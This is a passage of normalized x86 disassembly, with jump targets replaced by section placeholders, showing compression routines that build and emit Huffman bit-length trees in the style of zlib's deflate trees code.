mov eax [ ebp + 0x8 ]
mov [ eax + edx * 2 + 0xb34 ] 0x0
jmp r-xdata
cmp [ ebp - 0x20 ] 0x23d
jge r-xdata
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x20 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0xb54 ]
mov [ ebp - 0x30 ] edx
mov eax [ ebp - 0x30 ]
mov ecx [ ebp - 0x10 ]
xor edx edx
mov dx [ ecx + eax * 4 + 0x2 ]
mov eax [ ebp - 0x10 ]
xor ecx ecx
mov cx [ eax + edx * 4 + 0x2 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x18 ]
cmp edx [ ebp - 0x8 ]
jle r-xdata
mov ecx [ ebp - 0x8 ]
sub ecx 0x1
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x10 ]
mov cx [ ebp - 0x18 ]
mov [ eax + edx * 4 + 0x2 ] cx
mov edx [ ebp - 0x30 ]
cmp edx [ ebp - 0x34 ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + eax * 2 + 0xb34 ]
sub dx 0x1
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + eax * 2 + 0xb34 ] dx
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov cx [ eax + edx * 2 + 0xb36 ]
add cx 0x2
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov [ eax + edx * 2 + 0xb36 ] cx
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov ax [ edx + ecx * 2 + 0xb34 ]
sub ax 0x1
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 2 + 0xb34 ] ax
mov eax [ ebp - 0xc ]
sub eax 0x2
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jg r-xdata
mov edx [ ebp - 0x18 ]
sub edx 0x1
mov [ ebp - 0x18 ] edx
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + eax * 2 + 0xb34 ]
add dx 0x1
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + eax * 2 + 0xb34 ] dx
mov [ ebp - 0x24 ] 0x0
mov edx [ ebp - 0x30 ]
cmp edx [ ebp - 0x2c ]
jl r-xdata
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + edx * 2 + 0xb34 ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0x30 ]
mov ecx [ ebp - 0x10 ]
mov dx [ ecx + eax * 4 ]
mov [ ebp - 0x1c ] dx
mov eax [ ebp - 0x1c ]
and eax 0xffff
mov ecx [ ebp - 0x18 ]
add ecx [ ebp - 0x24 ]
imul eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x16a0 ]
add ecx eax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16a0 ] ecx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
sub eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + eax * 4 ]
mov [ ebp - 0x24 ] edx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x18 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x1c ]
and eax 0xffff
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
xor esi esi
mov si [ edx + ecx * 4 + 0x2 ]
add esi [ ebp - 0x24 ]
imul eax esi
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x16a4 ]
add edx eax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16a4 ] edx
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + eax * 2 + 0xb34 ]
mov [ ebp - 0x30 ] edx
jmp r-xdata
mov eax [ ebp - 0x20 ]
sub eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x20 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + ecx * 4 + 0xb54 ]
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x28 ]
cmp ecx [ ebp - 0x34 ]
jle r-xdata
mov edx [ ebp - 0x18 ]
sub edx 0x1
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x10 ]
xor ecx ecx
mov cx [ eax + edx * 4 + 0x2 ]
cmp ecx [ ebp - 0x18 ]
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x30 ]
sub eax 0x1
mov [ ebp - 0x30 ] eax
jmp r-xdata
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x10 ]
xor ecx ecx
mov cx [ eax + edx * 4 + 0x2 ]
mov edx [ ebp - 0x18 ]
sub edx ecx
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x10 ]
xor esi esi
mov si [ ecx + eax * 4 ]
imul edx esi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16a0 ]
add ecx edx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16a0 ] ecx
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x10 ]
mov dx [ ebp - 0x18 ]
mov [ ecx + eax * 4 + 0x2 ] dx
cmp [ ebp - 0x30 ] 0x0
je r-xdata
sub_406be0
push ebp
mov ebp esp
sub esp 0x34
push esi
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] 0xf
jg r-xdata
mov [ ebp - 0x2c ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x28 ]
and ecx 0xffff
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x10 ]
xor esi esi
mov si [ eax + edx * 2 - 0x2 ]
add ecx esi
shl ecx 0x1
mov [ ebp - 0x28 ] cx
mov ecx [ ebp - 0x4 ]
mov dx [ ebp - 0x28 ]
mov [ ebp + ecx * 2 - 0x24 ] dx
jmp r-xdata
mov ecx [ ebp - 0x2c ]
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
pop esi
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x2c ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + edx * 4 + 0x2 ]
mov [ ebp - 0x30 ] ecx
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov edx [ ebp - 0x30 ]
push edx
mov eax [ ebp - 0x30 ]
xor ecx ecx
mov cx [ ebp + eax * 2 - 0x24 ]
mov [ ebp - 0x34 ] ecx
mov edx [ ebp - 0x34 ]
push edx
mov eax [ ebp - 0x30 ]
mov cx [ ebp + eax * 2 - 0x24 ]
add cx 0x1
mov edx [ ebp - 0x30 ]
mov [ ebp + edx * 2 - 0x24 ] cx
call sub_40891c
add esp 0x8
mov ecx [ ebp - 0x2c ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 ] ax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x2c ]
add eax 0x1
mov [ ebp - 0x2c ] eax
sub_406ca5
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xb14 ]
push ecx
mov edx [ ebp + 0x8 ]
add edx 0x8c
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_406d5c
add esp 0xc
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xb20 ]
push edx
mov eax [ ebp + 0x8 ]
add eax 0x980
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_406d5c
add esp 0xc
mov edx [ ebp + 0x8 ]
add edx 0xb28
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_40636e
add esp 0x8
mov [ ebp - 0x4 ] 0x12
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
jl r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
imul eax eax 0x3
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x16a0 ]
lea eax [ edx + eax + 0xe ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16a0 ] eax
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
xor eax eax
mov al [ edx + r--data ]
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + eax * 4 + 0xa76 ]
test edx edx
je r-xdata
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx 0x1
mov [ ebp - 0x4 ] ecx
sub_406d5c
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0x18 ] 0xffffffff
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cx [ eax + 0x2 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] 0x7
mov [ ebp - 0x10 ] 0x4
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax + edx * 4 + 0x6 ] 0xffff
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
mov [ ebp - 0xc ] 0x8a
mov [ ebp - 0x10 ] 0x3
mov edx [ ebp - 0x1c ]
cmp edx [ ebp + 0x10 ]
jg r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp + 0xc ]
xor eax eax
mov ax [ edx + ecx * 4 + 0x6 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
cmp edx [ ebp - 0xc ]
jge r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp - 0x10 ]
jge r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
mov cx [ eax + edx * 4 + 0xa74 ]
add cx [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
mov [ eax + edx * 4 + 0xa74 ] cx
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x4 ] 0xa
jg r-xdata
mov ecx [ ebp - 0x14 ]
cmp ecx [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x18 ] ecx
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x1c ]
add ecx 0x1
mov [ ebp - 0x1c ] ecx
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0xabc ]
add dx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0xabc ] dx
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0xab8 ]
add dx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0xab8 ] dx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0xab4 ]
add dx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0xab4 ] dx
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
mov cx [ eax + edx * 4 + 0xa74 ]
add cx 0x1
mov edx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
mov [ eax + edx * 4 + 0xa74 ] cx
mov edx [ ebp - 0x14 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov [ ebp - 0xc ] 0x8a
mov [ ebp - 0x10 ] 0x3
jmp r-xdata
mov [ ebp - 0xc ] 0x7
mov [ ebp - 0x10 ] 0x4
mov [ ebp - 0xc ] 0x6
mov [ ebp - 0x10 ] 0x3
jmp r-xdata
jmp r-xdata
sub_406ef9
push ebp
mov ebp esp
sub esp 0x24
mov [ ebp - 0x8 ] 0x5
mov eax 0x10
sub eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x16b4 ] eax
jle r-xdata
mov edx [ ebp + 0xc ]
sub edx 0x101
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov edx [ ebp + 0xc ]
sub edx 0x101
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0xc ]
and eax 0xffff
mov ecx [ ebp + 0x8 ]
mov edx 0x10
sub edx [ ecx + 0x16b4 ]
mov ecx edx
sar eax cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x8 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov edx [ ebp + 0x10 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov ecx [ ebp + 0x10 ]
sub ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x14 ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x10 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov [ ebp - 0x10 ] 0x5
mov edx 0x10
sub edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] edx
jle r-xdata
mov edx [ ebp + 0x14 ]
sub edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov ecx [ ebp + 0x14 ]
sub ecx 0x4
mov [ ebp - 0x1c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x1c ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x1c ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x18 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov [ ebp - 0x18 ] 0x4
mov edx 0x10
sub edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] edx
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0x14 ]
jge r-xdata
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edx [ ebp + 0xc ]
sub edx 0x1
push edx
mov eax [ ebp + 0x8 ]
add eax 0x8c
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40741c
add esp 0xc
mov edx [ ebp + 0x10 ]
sub edx 0x1
push edx
mov eax [ ebp + 0x8 ]
add eax 0x980
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40741c
add esp 0xc
mov esp ebp
pop ebp
retn
mov [ ebp - 0x20 ] 0x3
mov ecx 0x10
sub ecx [ ebp - 0x20 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x16b4 ] ecx
jle r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov dl [ ecx + r--data ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + edx * 4 + 0xa76 ]
mov edx ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x20 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov cl [ eax + r--data ]
mov edx [ ebp + 0x8 ]
xor eax eax
mov ax [ edx + ecx * 4 + 0xa76 ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0x24 ]
and eax 0xffff
mov ecx [ ebp + 0x8 ]
mov edx 0x10
sub edx [ ecx + 0x16b4 ]
mov ecx edx
sar eax cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x20 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
add edx 0x1
mov [ ebp - 0x4 ] edx
jmp r-xdata
sub_40741c
push ebp
mov ebp esp
sub esp 0x5c
mov [ ebp - 0x18 ] 0xffffffff
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cx [ eax + 0x2 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] 0x7
mov [ ebp - 0x10 ] 0x4
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
mov [ ebp - 0xc ] 0x8a
mov [ ebp - 0x10 ] 0x3
mov eax [ ebp - 0x1c ]
cmp eax [ ebp + 0x10 ]
jg r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x1c ]
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cx [ eax + edx * 4 + 0x6 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x4 ]
add edx 0x1
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0xc ]
jge r-xdata
mov edx [ ebp - 0x4 ]
cmp edx [ ebp - 0x10 ]
jge r-xdata
mov ecx [ ebp - 0x14 ]
cmp ecx [ ebp - 0x8 ]
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + eax * 4 + 0xa76 ]
mov [ ebp - 0x20 ] edx
mov eax 0x10
sub eax [ ebp - 0x20 ]
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x16b4 ] eax
jle r-xdata
jmp r-xdata
cmp [ ebp - 0x4 ] 0xa
jg r-xdata
mov ecx [ ebp - 0x14 ]
cmp ecx [ ebp - 0x18 ]
je r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
xor eax eax
mov ax [ edx + ecx * 4 + 0xa74 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x16b4 ]
shl eax cl
mov edx [ ebp + 0x8 ]
mov cx [ edx + 0x16b0 ]
or cx ax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
add ecx [ ebp - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] ecx
mov edx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + edx * 4 + 0xa74 ]
mov [ ebp - 0x24 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x24 ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x24 ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x20 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov edx [ ebp - 0x1c ]
add edx 0x1
mov [ ebp - 0x1c ] edx
mov edx [ ebp + 0x8 ]
xor eax eax
mov ax [ edx + 0xabe ]
mov [ ebp - 0x50 ] eax
mov ecx 0x10
sub ecx [ ebp - 0x50 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x16b4 ] ecx
jle r-xdata
mov edx [ ebp + 0x8 ]
xor eax eax
mov ax [ edx + 0xaba ]
mov [ ebp - 0x40 ] eax
mov ecx 0x10
sub ecx [ ebp - 0x40 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x16b4 ] ecx
jle r-xdata
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0xab6 ]
mov [ ebp - 0x30 ] edx
mov eax 0x10
sub eax [ ebp - 0x30 ]
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x16b4 ] eax
jle r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + edx * 4 + 0xa76 ]
mov [ ebp - 0x28 ] ecx
mov edx 0x10
sub edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] edx
jle r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
sub eax 0x1
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0xabc ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x50 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0xabc ]
mov [ ebp - 0x54 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x54 ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
